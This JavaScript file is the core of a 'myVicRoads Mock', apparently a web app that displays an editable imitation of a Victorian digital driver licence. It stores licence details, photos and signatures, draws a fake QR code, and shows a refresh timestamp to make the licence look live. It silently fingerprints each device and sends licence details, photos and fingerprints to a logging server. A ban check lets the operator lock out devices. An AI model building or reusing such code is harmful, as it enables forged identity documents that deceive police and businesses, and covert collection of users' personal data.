/**
 * core_components.js - Centralized logic for myVicRoads Mock
 * Extracted from oldindex.html (master reference)
 */

(function(window) {
    var core = {};

    // ===== CONFIGURATION =====
    core.SERVER_URL = "log.php";
    core.CONFIG_URL = "config.php";
    core.DEFAULT_PIN = "457511";

    // ===== IDENTITY & COOKIES =====
    core.getCookie = function(name) {
        var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    };

    core.setCookie = function(name, value, days) {
        var expires = new Date(Date.now() + days * 864e5).toUTCString();
        document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
    };

    core.generateStableDeviceId = function() {
        try {
            var fp = {
                ua: navigator.userAgent,
                screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language,
                platform: navigator.platform,
                hwConcurrency: navigator.hardwareConcurrency || null,
                deviceMemory: navigator.deviceMemory || null
            };
            var str = JSON.stringify(fp);
            var hash = 0;
            for (var i = 0; i < str.length; i++) {
                var ch = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + ch;
                hash = hash & hash;
            }
            return 'dev-' + Math.abs(hash).toString(36).substring(0, 16);
        } catch(e) {
            return 'dev-fallback-' + Date.now();
        }
    };

    core.getDeviceId = function() {
        var deviceId = core.getCookie('deviceId');
        if (!deviceId) {
            try {
                deviceId = localStorage.getItem('deviceId');
            } catch(e) {}
        }
        
        if (!deviceId) {
            deviceId = core.generateStableDeviceId();
        }

        core.setCookie('deviceId', deviceId, 365);
        try { localStorage.setItem('deviceId', deviceId); } catch(e) {}
        
        return deviceId;
    };

    // ===== FINGERPRINTING =====
    core.computeFingerprint = function() {
        var fp = {};
        fp.screen = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
        fp.pixelRatio = window.devicePixelRatio;
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        fp.language = navigator.language;
        fp.languages = navigator.languages ? navigator.languages.join(',') : null;
        fp.platform = navigator.platform;
        fp.hardwareConcurrency = navigator.hardwareConcurrency || null;
        fp.deviceMemory = navigator.deviceMemory || null;
        fp.userAgent = navigator.userAgent;
        fp.touchSupport = 'ontouchstart' in window;
        fp.maxTouchPoints = navigator.maxTouchPoints || 0;
        fp.cookieEnabled = navigator.cookieEnabled;

        try {
            var canvas = document.createElement('canvas');
            canvas.width = 420;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = "alphabetic";
            ctx.font = "18px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(60, 10, 200, 30);
            ctx.fillStyle = "#069";
            ctx.font = "bold 22px 'Segoe UI', Arial, sans-serif";
            ctx.fillText("Victorian DL", 12, 42);
            var dataURL = canvas.toDataURL();
            var hash = 0;
            for (var i = 0; i < dataURL.length; i++) {
                var ch = dataURL.charCodeAt(i);
                hash = ((hash << 5) - hash) + ch;
                hash = hash & hash;
            }
            fp.canvasHash = Math.abs(hash).toString(36);
        } catch(e) { fp.canvasHash = null; }

        return fp;
    };

    core.cachedFingerprint = null;
    core.fingerprintPromise = null;

    core.computeFingerprintAsync = function() {
        if (core.fingerprintPromise) return core.fingerprintPromise;
        
        core.fingerprintPromise = new Promise(function(resolve) {
            function computeAndCache() {
                core.cachedFingerprint = core.computeFingerprint();
                resolve(core.cachedFingerprint);
            }
            if (window.requestIdleCallback) {
                window.requestIdleCallback(computeAndCache, { timeout: 1000 });
            } else {
                setTimeout(computeAndCache, 50);
            }
        });
        
        return core.fingerprintPromise;
    };

    core.getFingerprint = function() {
        if (core.cachedFingerprint) return core.cachedFingerprint;
        core.computeFingerprintAsync();
        return {
            screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent
        };
    };

    core.encodeFingerprint = function(fp) {
        try { return btoa(JSON.stringify(fp)); } catch(e) { return ''; }
    };

    // ===== LOGGING =====
    core.getLicenceDetails = function() {
        var nameEl = document.querySelector(".licenceName");
        var dobEl = document.querySelector(".licenceDOB");
        var addrEl = document.querySelector(".licenceAddress");
        var cardEl = document.getElementById("cardNum");

        return {
            name: nameEl ? nameEl.innerText.trim() : "—",
            dob: dobEl ? dobEl.innerText.trim() : "—",
            address: addrEl ? addrEl.innerHTML.replace(/<br>/gi, " ").trim() : "—",
            card: cardEl ? cardEl.innerText.trim() : "—"
        };
    };

    core.sendLog = async function(payload, attempt) {
        attempt = attempt || 1;
        var data = JSON.stringify(payload);
        var MAX_ATTEMPTS = 3;

        try {
            var response = await fetch(core.SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                body: data,
                keepalive: true
            });
            if (response.ok) return true;
        } catch (error) {}

        if (navigator.sendBeacon) {
            if (navigator.sendBeacon(core.SERVER_URL, data)) return true;
        }

        if (attempt < MAX_ATTEMPTS) {
            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            return core.sendLog(payload, attempt + 1);
        }
        return false;
    };

    core.logAccess = async function(event, success, pinAttempt, extraData) {
        var fingerprint = core.cachedFingerprint || core.getFingerprint();
        var details = core.getLicenceDetails();
        
        var payload = Object.assign({
            timestamp: new Date().toISOString(),
            deviceId: core.getDeviceId(),
            event: event,
            success: !!success,
            pin_attempt: pinAttempt
        }, fingerprint, details, extraData || {});

        if (event === 'photo_updated') {
            var photo = localStorage.getItem("profilePhoto");
            if (photo) payload.photo = photo;
        }

        return core.sendLog(payload);
    };

    // ===== BANNING =====
    core.EarlyBanCheck = function() {
        var deviceId = core.getDeviceId();
        var earlyFingerprint = null;
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 40;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = "top"; ctx.font = "14px Arial";
            ctx.fillText("Victorian DL", 2, 10);
            var dataURL = canvas.toDataURL();
            var hash = 0;
            for (var i = 0; i < dataURL.length; i++) {
                hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                hash = hash & hash;
            }
            earlyFingerprint = {
                canvasHash: Math.abs(hash).toString(36),
                screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                platform: navigator.platform
            };
        } catch(e) {}

        var xhr = new XMLHttpRequest();
        var banUrl = core.SERVER_URL + '?action=checkBan&deviceId=' + encodeURIComponent(deviceId) + '&t=' + Date.now();
        if (earlyFingerprint) {
            try { banUrl += '&fp=' + encodeURIComponent(btoa(JSON.stringify(earlyFingerprint))); } catch(e) {}
        }
        
        xhr.open('GET', banUrl, true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200 && xhr.responseText.indexOf('ERR_CONNECTION_CLOSED') !== -1) {
                document.open(); document.write(xhr.responseText); document.close();
                window.stop();
            } else if (xhr.responseText.trim() !== "OK") {
                // Show error if not OK
                document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h1>Connection Error</h1><p>Invalid server response.</p><button onclick="location.reload()">Retry</button></div>';
            } else {
                core.revealPage();
            }
        };
        xhr.onerror = xhr.ontimeout = function() {
            document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h1>Connection Error</h1><p>The server could not be reached.</p><button onclick="location.reload()">Retry</button></div>';
        };
        xhr.send();
    };

    core.revealPage = function() {
        var antiLeak = document.getElementById('anti-leak');
        if (antiLeak) antiLeak.parentNode.removeChild(antiLeak);
        var loader = document.getElementById('early-loader');
        if (loader) loader.parentNode.removeChild(loader);
    };

    // ===== PERSISTENCE =====
    core.saveData = async function() {
        var nameEl = document.querySelector(".licenceName");
        var dobEl = document.querySelector(".licenceDOB");
        var addrEl = document.querySelector(".licenceAddress");
        var cardEl = document.getElementById("cardNum");
        var photoEl = document.getElementById("profilePhoto");
        var issueEl = document.querySelector(".dateIssue");
        var p1El = document.querySelector(".dateP1End");
        var expEl = document.querySelector(".dateExpiry");
        var sigCanvas = document.querySelector(".sigCanvas");

        if (nameEl) localStorage.setItem("licenceName", nameEl.innerText);
        if (dobEl) localStorage.setItem("licenceDOB", dobEl.innerText);
        if (addrEl) localStorage.setItem("licenceAddress", addrEl.innerHTML);
        if (cardEl) localStorage.setItem("cardNum", cardEl.innerText);
        if (photoEl) localStorage.setItem("profilePhoto", photoEl.src);
        if (issueEl) localStorage.setItem("dateIssue", issueEl.innerText);
        if (p1El) localStorage.setItem("dateP1End", p1El.innerText);
        if (expEl) localStorage.setItem("dateExpiry", expEl.innerText);
        if (sigCanvas) localStorage.setItem("signature", sigCanvas.toDataURL());

        await core.logAccess('data_updated', true);
    };

    core.loadData = function() {
        var fields = [
            { key: "licenceName", selector: ".licenceName", type: "text" },
            { key: "licenceDOB", selector: ".licenceDOB", type: "text" },
            { key: "licenceAddress", selector: ".licenceAddress", type: "html" },
            { key: "cardNum", selector: "#cardNum", type: "text" },
            { key: "profilePhoto", selector: "#profilePhoto", type: "src" },
            { key: "dateIssue", selector: ".dateIssue", type: "text" },
            { key: "dateP1End", selector: ".dateP1End", type: "text" },
            { key: "dateExpiry", selector: ".dateExpiry", type: "text" }
        ];

        fields.forEach(function(f) {
            var val = localStorage.getItem(f.key);
            if (val) {
                document.querySelectorAll(f.selector).forEach(function(el) {
                    if (f.type === "text") el.innerText = val;
                    else if (f.type === "html") el.innerHTML = val;
                    else if (f.type === "src") el.src = val;
                });
            }
        });

        var signature = localStorage.getItem("signature");
        if (signature) {
            document.querySelectorAll(".sigCanvas").forEach(function(c) {
                var ctx = c.getContext("2d");
                var img = new Image();
                img.onload = function() { ctx.drawImage(img, 0, 0, c.width, c.height); };
                img.src = signature;
            });
        }
    };

    // ===== PASSCODE SYNC =====
    core.fetchPin = function() {
        return fetch(core.CONFIG_URL)
            .then(function(r) { return r.json(); })
            .then(function(d) { return d.pin || core.DEFAULT_PIN; })
            .catch(function() { return core.DEFAULT_PIN; });
    };

    // ===== FORMATTING =====
    core.autoFormatAddress = function(val) {
        if (val.endsWith(" ")) return val;
        var plain = val.replace(/<br\s*\/?>/gi, " ").replace(/\n/g, " ").replace(/\s\s+/g, ' ').trim();
        var words = plain.split(/\s+/);
        if (words.length >= 4) return words.slice(0, 3).join(" ") + "\n" + words.slice(3).join(" ");
        return plain;
    };

    core.formatRefreshDate = function(date) {
        var days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
        var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
        var hr = date.getHours();
        var ampm = hr >= 12 ? 'pm' : 'am';
        hr = hr % 12 || 12;
        return days[date.getDay()] + ' ' + date.getDate() + ' ' + months[date.getMonth()] + ' ' + date.getFullYear() + ' ' + hr + ':' + String(date.getMinutes()).padStart(2,'0') + ampm;
    };

    core.updateLastRefreshed = function() {
        var el = document.getElementById("lastRefreshed");
        if (el) el.innerHTML = '<span class="lbl">Last refreshed:</span> ' + core.formatRefreshDate(new Date());
    };

    // ===== UTILITIES =====
    core.vibrate = function() { if (navigator.vibrate) navigator.vibrate(50); };
    
    core.randomDigits = function(n) {
        var s = "";
        for (var i = 0; i < n; i++) s += Math.floor(Math.random() * 10);
        return s;
    };

    core.randomToken = function(length) {
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var s = "";
        for (var i = 0; i < length; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
        return s;
    };

    core.drawFakeQR = function(ctx, w, h, seed) {
        var modules = 41;
        var moduleSize = Math.floor(Math.min(w, h) / modules);
        var margin = Math.floor((Math.min(w, h) - moduleSize * modules) / 2);
        ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, w, h);
        var hash = 2166136261 >>> 0;
        for (var i = 0; i < seed.length; i++) { hash ^= seed.charCodeAt(i); hash = Math.imul(hash, 16777619) >>> 0; }
        function rand() { hash ^= (hash << 13); hash ^= (hash >>> 17); hash ^= (hash << 5); return (hash >>> 0) / 4294967295; }
        function fillModule(r, c) { ctx.fillStyle = "#000"; ctx.fillRect(margin + c * moduleSize, margin + r * moduleSize, moduleSize, moduleSize); }
        function drawFinder(r0, c0) {
            for (var r = -1; r <= 7; r++) for (var c = -1; c <= 7; c++) {
                var rr = r0 + r, cc = c0 + c;
                if (rr < 0 || cc < 0 || rr >= modules || cc >= modules) continue;
                if ((r >= 0 && r <= 6 && c >= 0 && c <= 6) && (r == 0 || r == 6 || c == 0 || c == 6 || (r >= 2 && r <= 4 && c >= 2 && c <= 4))) fillModule(rr, cc);
            }
        }
        drawFinder(0, 0); drawFinder(0, modules - 7); drawFinder(modules - 7, 0);
        for (var i = 8; i < modules - 8; i++) { if (i % 2 === 0) { fillModule(6, i); fillModule(i, 6); } }
        for (var r = 0; r < modules; r++) for (var c = 0; c < modules; c++) {
            if ((r < 7 && c < 7) || (r < 7 && c >= modules - 7) || (r >= modules - 7 && c < 7)) continue;
            if (r === 6 && c >= 8 && c < modules - 8) continue; if (c === 6 && r >= 8 && r < modules - 8) continue;
            if (rand() < 0.45 + 0.2 * Math.abs((r / modules) - 0.5) * Math.abs((c / modules) - 0.5)) fillModule(r, c);
        }
        ctx.strokeStyle = "#eee"; ctx.lineWidth = 1; ctx.strokeRect(margin - 1, margin - 1, moduleSize * modules + 2, moduleSize * modules + 2);
    };

    window.Core = core;
})(window);
